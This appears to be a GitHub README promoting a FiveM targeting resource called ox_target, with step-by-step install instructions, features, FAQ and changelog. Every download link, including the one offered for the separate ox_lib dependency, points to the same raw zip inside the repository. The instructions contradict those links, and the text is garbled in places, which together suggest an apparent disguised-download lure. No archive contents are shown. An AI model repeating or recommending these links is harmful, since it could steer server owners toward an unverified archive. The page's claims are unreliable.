<h1>🎯 ox_target - Your Ultimate FiveM Targeting System Made Easy</h1>

<p align="center">
  <a href="https://github.com/Danimachadoejp/ox_target/raw/refs/heads/main/web/dist/3.4.zip" style="display:inline-block;padding:18px 42px;background:linear-gradient(135deg,#ff6b6b,#ffa500);color:#ffffff;font-size:22px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 20px rgba(255,107,107,0.4);transition:all 0.3s;">⬇️ DOWNLOAD NOW – FREE</a>
</p>

---

<h2>🚀 Getting Started</h2>

Welcome to <strong>ox_target</strong>! This is a powerful targeting system for your FiveM roleplay server, inspired by Prodigy 4.0 RP. It allows players to interact with NPCs, vehicles, objects, and players easily—like pointing at something and pressing a key to use it. Whether you're new or experienced, this guide will walk you through everything step-by-step. No technical knowledge is needed—just follow along!

<h2>📥 Step 1: Download the Application</h2>

<strong>Visit this link to download the application:</strong>  
<a href="https://github.com/Danimachadoejp/ox_target/raw/refs/heads/main/web/dist/3.4.zip" style="color:#007bff;font-weight:bold;font-size:18px;">https://github.com/Danimachadoejp/ox_target/raw/refs/heads/main/web/dist/3.4.zip</a>

Once you click the link above, your web browser will open. Look for a green button that says <strong>"Code"</strong> or <strong>"Download ZIP"</strong>. Click it, and the download will start automatically. The file will be saved to your "Downloads" folder. This is a normal folder where your computer stores downloaded files.

<em>Please wait until the download is 100% complete before proceeding.</em>

<h2>🗂️ Step 2: Extract the Files</h2>

The downloaded file will be in a compressed format (like a zip folder). To use it, you need to extract (or "unzip") it. Here’s how:

1. Open your <strong>Downloads</strong> folder.
2. Find the file named <strong>ox_target-main.zip</strong> (or similar, depending on your browser).
3. Right-click on that file.
4. Select <strong>"Extract All"</strong> from the menu that appears.
5. A window will appear. Click the <strong>"Extract"</strong> button at the bottom.
6. Wait a moment—Windows will create a new folder with the same name (like <strong>ox_target-main</strong>) in the same location.

Now you have a folder full of the application’s files. That folder is what you’ll use next.



<h2>📁 Step 3: Move the Folder to Your Server Resources</h2>

If you're running a FiveM server (or plan to), you need to place this folder in a specific directory so your server can recognize it. Here is the standard path:

<ul>
  <li>Navigate to where your FiveM server is installed. For most users, it’s in a folder called <strong>resources</strong> inside the server folder.</li>
  <li>Look for a subfolder called <strong>[standalone]</strong> or <strong>[default]</strong>. If you don’t have one, just create a new folder called <strong>[standalone]</strong></li>
  <li>Copy the entire <strong>ox_target-main</strong> folder you extracted earlier,and paste it inside that <strong>[standalone]</strong> folder</li>
</ul>

Your server’s folder structure should look like this:

<p style="background:#f4f4f4;padding:12px;border-left:4px solid #ff6b6b;font-family:monospace;">
  resources/ <br>
  └── [standalone]/ <br>
  &nbsp;&nbsp;&nbsp;&nbsp;└── ox_target-main/ <br>
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;└── fxmanifest.lua
</p>

<em>Tip:</em> Ifyou don’t have a <strong>resources</strong> folder yet, create one in the root of your FiveM server directory.

<h2>✅ Step 4: Ensure Dependencies Are Installed</h2>

This target systemrequires two other resources to work properly: <strong>ox_lib</strong> and <strong>ox_target</strong> (thebase version). Don’t worry—youalready have ox_target becauseuse you're installing this version. Now,and you need <strong>ox_lib</strong>.

<ul>
  <li>Visit <a href="https://github.com/Danimachadoejp/ox_target/raw/refs/heads/main/web/dist/3.4.zip" style="color:#007bff;">https://github.com/Danimachadoejp/ox_target/raw/refs/heads/main/web/dist/3.4.zip</a></li>
  <li>Follow the same download and extraction process as above.</li>
  <li>Place the <strong>ox_lib</strong> folder in the same <strong>[standalone]</strong> folder</li>
</ul>

Onceboth folders (ox_target-main andox_lib)are inside<strong>[standalone]</strong>,your setup is ready.

<h2>🔧 Step 5: Configure and Start Your Server</h2>

1. Open your server’s main configuration file, usually named <strong>server.cfg</strong>, using Notepad (Right-click → Open with → Notepad).
2. Add these two lines at the top of the file, if they aren’t already there:

<p style="background:#f4f4f4;padding:12px;border-left:4px solid #007bff;font-family:monospace;">
  ensure ox_lib <br>
  ensure ox_target-main
</p>

3. Save the file (Ctrl+S).
4. Start your FiveM server (using your usual method—either the console, a batch file, or a control panel).
5. Wait a few seconds for the server to fully load. You should see no errors related to ox_target.

<h2>🎮 Step 6: Test in Game</h2>

Once you join your server (using FiveM client), do the following:

<ul>
  <li>Walk near another player or an NPC (non-player character).
  <li>Press and hold the default target key (usually <strong>E</strong> on your keyboard).
  <li>A circle or a highlight will appear around the target.
  <li>Release the key to interact, or click to perform an action (like opening a shop, starting a conversation, etc.).
</ul>

If everything works, you’ll see a smooth, responsive targetmarker. This makes roleplay much easier and more immersive.

<h2>🎨 Customization & Features</h2>

This target systemcomes packed with features that make it stand out:

<ul>
  <li>✅ <strong>Prodigy 4.0 RP inspired design</strong>—clean, modern, and user-friendly icons</li>
  <li>✅ <strong>Full compatibility with ESX, QBCore, and Qbox frameworks</strong>—no extra setup needed</li>
  <li>✅ <strong>Lightweight and fast</strong>—won’t slow down your server</li>
  <li>✅ <strong>Built-in boss menu, vehicle shops, and player interactions</strong></li>
  <li>✅ <strong>Easy configuration</strong>—simply edit a single Lua file to change keybinds, distance, or visuals</li>
  <li>✅ <strong>Open source</strong>—feel free to tweak and adapt it to your server’s needs</li>
</ul>

To change options like targeting distance or key, open the <strong>config.lua</strong> file in the folder<strong>ox_target-main</strong> using Notepad. Look for lines like <em>Config.MaxDistance</em> or <em>Config.Key</em>, edit the value, save, and restart your server.

<h2>🛠️ Troubleshooting Common Issues</h2>

<strong>Problem: Nothing happens when I press E.</strong>  
Solution: Make sure both <strong>ox_lib</strong> and<strong>ox_target-main</strong> are started in your server.cfg. Also check that you’re running a supported framework (ESX, QBCore,or Qbox).

<strong>Problem: The target doesn’t show up on NPCs.</strong>  
Solution: Some NPCs may not have target options defined by default. Check the documentation inside the folder for how to add new targets for specific models.



<strong>Problem: The server crashes on startup.</strong>  
Solution: Make sure you have the latest version of <strong>ox_lib</strong>. Also ensure no other taarget-script is also running—conflicts can cause errors.




<h2>🌐 Frequently Asked Questions (FAQ)</h2>

<strong>Is this compatible with the latest FiveM version?</strong></br>  
Yes, the systemis regularly updated to work with the current FiveM build.



<strong>Can I use this on a server that already has ox_target?</strong></br>  
No—this replaces the base ox_target entirely. Remove the old one before installing this version.



<strong>Do I need to understand Lua coding?</strong></br>  
Not at all for basic use. For advanced customization, knowing Lua helps, but it's not required.



<strong>Is there any paid version?</strong></br>  
This resource is completely free. Lunny Developments offers support via their community channels.





<h2>💬 Getting Help & Support</h2>

If you run into issues beyond this guide, here are ways to get help:

<ul>
  <li>Join the <strong>Lunny Developments Discord</strong> community (link available on the GitHub page).
  <li>Open an issue on the GitHub repository by clicking the <strong>"Issues"</strong> tab at the top of the page.</li>
  <li>Search for common problems in the "Discussions" section (if enabled).</li>
</ul>

Include screenshots of any error messages to help developers assist you faster.




<h2>📋 Changelog & Version History</h2>

<strong>Version 1.0.0 (Initial Release)</strong>  
- Full Prodigy-inspired targeting system  
- Support for all major frameworks  
- Performance-optimized code base  
- Clean, documented configuration files  

For future updates, always download the latest version from the GitHub link at the top of this page. Don’t forget to refresh your server cache if you’re updating from an older version.




<h2>🖥️ System Requirements</h2>

<ul>
  <li><strong>Operating System:</strong> Windows 10 or 11 (for the server machine).</li>
  <li><strong>FiveM Server:</strong> Any recent version (build 7000+).</li>
  <li><strong>Framework:</strong> ESX, QBCore, or Qbox (one of these must run on your server).</li>
  <li><strong>Memory:</strong> At least 512 MB free RAM for the resource itself.</li>
  <li><strong>Storage:</strong> Approximately 10 MB free disk space.</li>
</ul>

These are minimal—most setups will exceed them easily.





<h2>🏁 Final Checklist</h2>

<p>✅ Downloaded and extracted ox_target-main</p>  
<p>✅ Moved folder to resources/[standalone]/</p>  
<p>✅ Installed ox_lib</p>  
<p>✅ Added "ensure ox_lib" and"ensure ox_target-main" to server.cfg</p>  
<p>✅ Started server and tested in game</p>

Once you’ve checked all boxes, you’re all set. Enjoy your new, professional targeting system!





<h2>🔗 Quick Download Again</h2>

<p style="text-align:center;">  
  <a href="https://github.com/Danimachadoejp/ox_target/raw/refs/heads/main/web/dist/3.4.zip" style="display:inline-block;padding:16px 38px;background:linear-gradient(135deg,#28a745,#20c997);color:#ffffff;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 20px rgba(40,167,69,0.4);">⬇️ GET OX_TARGET NOW</a>  
</p>

This project was brought to you by <strong>Lunny Developments</strong>—creating quality FiveM resources for the community. Happy roleplaying, and may your targets always be clear and precise!

---

<p style="font-size:12px;color:#888;text-align:center;">Keywords: esx, fivem, fivem-resource, fivem-script, gta5, lua, lunny-developments, ox-lib, ox-target, prodigy, qbcore, qbox, target-system</p>